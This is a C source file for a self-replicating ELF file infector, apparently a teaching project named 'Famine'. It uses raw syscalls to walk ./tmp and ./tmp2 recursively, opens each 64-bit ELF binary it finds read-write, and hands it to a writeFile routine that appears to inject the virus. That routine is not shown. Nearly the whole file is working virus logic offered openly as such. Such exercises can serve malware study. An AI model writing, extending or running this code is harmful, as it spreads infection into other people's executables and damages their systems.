#include "virus.h"

void virus(char *file) {
    struct ELFheaders64 fHdr;
    int bytes_rd;
    int fd;

    fd = (int)ft_syscall((void *)file, (void *)2, 0, 0, OPEN);
    if (fd < 0)
        return ;
    bytes_rd = (int)ft_syscall((void *)fd, (void *)&fHdr, (void *)0x40, 0, READ);
    if (bytes_rd < 0x40 || check_file(fHdr) != 0)
        return;

    // ft_syscall((void *)1, (void *)file, (void *)ft_strlen(file), 0, WRITE);
    writeFile(fd, fHdr);
    ft_syscall((void *)fd, 0, 0, 0, CLOSE);
}

int famine(char *target_dir) {
    int fd;
    char full_path[0x1000];
    char dir[0x1000];
    int bytes_rode;
    char pt[] = {'.', '.', 0};
    char sep[] = {'/', 0};
   
    fd = (int)ft_syscall((void *)-100, (void *)target_dir, (void *)(0 | 2048 | 65536), (void *)0, OPENAT);
    if (fd < 0)
        return(1);
    do {
        bytes_rode = (int)ft_syscall((void *)fd, (void *)dir, (void *)0x1000, (void *)0, GETDENTS);
        for (int bpos = 0; bpos < bytes_rode;) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)((char *)dir + bpos);
            if (ft_strcmp(d->d_name, &(pt[1])) != 0 && ft_strcmp(d->d_name, pt) != 0)  {
                unsigned long int len = ft_strlen(target_dir);
                memncat(full_path, 0, target_dir, len);
                memncat(full_path, len, sep, 1);
                memncat(full_path, len+1, d->d_name, ft_strlen(d->d_name));

                if (isDir(full_path) == 1)
                    famine(full_path);
                else
                    virus(full_path);
                ft_memset(full_path, 0 , 0x1000);
            }
            if (d->d_reclen == 0)
                break;
            bpos += d->d_reclen;
        }
    }
    while (bytes_rode > 0);
    return (0);
}

int _start() {
    char target[] = {'.', '/', 't', 'm', 'p', 0};
    char target2[] = {'.', '/', 't', 'm', 'p', '2', 0};

    famine(target);
    famine(target2);
    ft_syscall(0, 0, 0, 0, EXIT);
}

